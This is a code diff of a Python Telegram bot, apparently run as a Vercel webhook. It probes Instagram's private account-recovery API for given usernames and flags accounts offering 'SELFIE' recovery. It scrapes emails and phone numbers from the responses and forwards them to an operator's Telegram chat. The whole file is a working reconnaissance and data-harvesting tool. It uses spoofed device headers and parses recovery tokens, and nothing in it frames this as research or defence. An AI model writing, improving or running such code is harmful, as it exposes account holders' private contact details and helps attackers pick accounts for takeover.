@@ -9,37 +9,33 @@ import threading
 import requests
 from http.server import BaseHTTPRequestHandler
 
-# ====================== ENV ======================
 TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
 if not TOKEN or not CHAT_ID:
-    raise Exception("BOT_TOKEN and CHAT_ID must be set in Vercel!")
+    raise Exception("BOT_TOKEN and CHAT_ID not set!")
 
-# ====================== GLOBALS ======================
-hads = 0
-bad = 0
-erore = 0
+hads = bad = erore = 0
 checked = set()
 lock = threading.Lock()
 
-# ====================== CHECK FUNCTION ======================
-def check_one(user):
-    global hads, bad, erore   # ← All globals at the TOP
-
+def check_one(user, chat_id):
+    global hads, bad, erore
     user = user.strip().lstrip('@').lower()
-    if not user:
-        return
 
     with lock:
         if user in checked:
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        json={"chat_id": chat_id, "text": f"@{user} already checked."})
             return
         checked.add(user)
 
+    # Send checking message
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                json={"chat_id": chat_id, "text": f"🔍 Checking @{user}..."})
+
     try:
         sess = requests.Session()
-        random_hex = ''.join(random.choices('0123456789abcdef', k=16))
-        ig_device_id = f"android-{random_hex}"
         device_id = str(uuid.uuid4())
 
         headers = {
@@ -50,12 +46,6 @@ def check_one(user):
             'x-ig-device-id': device_id,
         }
 
-        aac_object = {
-            "aac_init_timestamp": int(time.time()),
-            "aacjid": str(uuid.uuid4()),
-            "aaccs": ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=43))
-        }
-
         data = {
             'params': f'{{"client_input_params":{{"is_username_or_email":1,"search_query":"{user}"}},"server_params":{{"is_from_logged_out":0,"device_id":"{device_id}"}}}}',
             'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
@@ -63,7 +53,7 @@ def check_one(user):
         }
 
         res1 = sess.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.uhl.nav.async/', 
-                        headers=headers, data=data, timeout=12)
+                        headers=headers, data=data, timeout=10)
 
         if res1.status_code == 200:
             match = re.search(r'Q-PTB[a-zA-Z0-9_\-]*\|aplrr', res1.text)
@@ -75,25 +65,28 @@ def check_one(user):
                     data={'params': f'{{"server_params":{{"context_data":"{token}"}}}}', 
                           'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
                           'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5'},
-                    timeout=12
+                    timeout=10
                 ).text
 
                 if 'SELFIE' in res2.upper():
-                    hads += 1
+                    with lock: hads += 1
                     emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', res2)
                     phone = re.search(r'(\+\d{1,4}[\s\d\-\(\)]{8,})', res2)
-                    msg = f"🎯 SELFIE HIT!\n\n👤 @{user}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
-                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                                json={"chat_id": CHAT_ID, "text": msg})
+                    msg = f"🎯 **SELFIE FOUND!**\n\n👤 @{user}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
                 else:
-                    bad += 1
+                    with lock: bad += 1
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                                json={"chat_id": chat_id, "text": f"❌ @{user} → No Selfie"})
             else:
-                bad += 1
+                with lock: bad += 1
         else:
-            erore += 1
+            with lock: erore += 1
 
-    except:
-        erore += 1
+    except Exception as e:
+        with lock: erore += 1
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    json={"chat_id": chat_id, "text": f"⚠️ Timeout/Error on @{user}"})
 
 
 class handler(BaseHTTPRequestHandler):
@@ -109,11 +102,11 @@ class handler(BaseHTTPRequestHandler):
 
                 if text.startswith('/check '):
                     username = text.split(maxsplit=1)[1]
-                    threading.Thread(target=check_one, args=(username,), daemon=True).start()
-                    self.reply(chat_id, f"🔍 Checking @{username}...")
+                    threading.Thread(target=check_one, args=(username, chat_id), daemon=True).start()
 
                 elif text.startswith('/stats'):
-                    self.reply(chat_id, f"Selfie: {hads}\nBad: {bad}\nError: {erore}")
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                                json={"chat_id": chat_id, "text": f"Selfie: {hads}\nBad: {bad}\nError: {erore}"})
 
         except:
             pass
@@ -121,10 +114,6 @@ class handler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.end_headers()
         self.wfile.write(b'ok')
-
-    def reply(self, chat_id, text):
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-                     json={"chat_id": chat_id, "text": text})
 
 
 # Set webhook
